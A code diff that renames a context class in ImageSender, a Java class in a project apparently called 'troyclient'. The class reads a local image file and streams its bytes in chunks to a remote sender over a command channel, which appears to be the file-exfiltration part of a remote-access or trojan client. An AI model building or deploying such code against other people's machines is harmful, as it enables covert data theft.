@@ -1,7 +1,7 @@
 package ch.lebois.troyclient.service;
 
 
-import ch.lebois.troyclient.main.GetContext;
+import ch.lebois.troyclient.main.SystemVariables;
 import java.awt.image.BufferedImage;
 import java.io.ByteArrayOutputStream;
 import java.io.File;
@@ -18,7 +18,7 @@ public class ImageSender {
         byte[] bytes;
         try {
             String fullPath = System.getProperty("user.dir") + "/" + path;
-            GetContext.SENDER.send("commandout", fullPath);
+            SystemVariables.SENDER.send("commandout", fullPath);
 
             bufferedImage = ImageIO.read(new File(fullPath));
 
@@ -27,7 +27,7 @@ public class ImageSender {
             byteArrayOutputStream.flush();
 
             bytes = byteArrayOutputStream.toByteArray();
-            GetContext.SENDER.send("imgSize", String.valueOf(bytes.length));
+            SystemVariables.SENDER.send("imgSize", String.valueOf(bytes.length));
             byteArrayOutputStream.close();
 
             StringBuilder byteHandler = new StringBuilder();
@@ -38,11 +38,11 @@ public class ImageSender {
                 byteHandler.append("_");
                 if (maxbytes == 0) {
                     maxbytes = 250;
-                    GetContext.SENDER.send("img", String.valueOf(byteHandler));
+                    SystemVariables.SENDER.send("img", String.valueOf(byteHandler));
                     byteHandler = new StringBuilder();
                 }
             }
-            GetContext.SENDER.send("imgend", "");
+            SystemVariables.SENDER.send("imgend", "");
 
             return bytes;
         } catch (IOException e) {
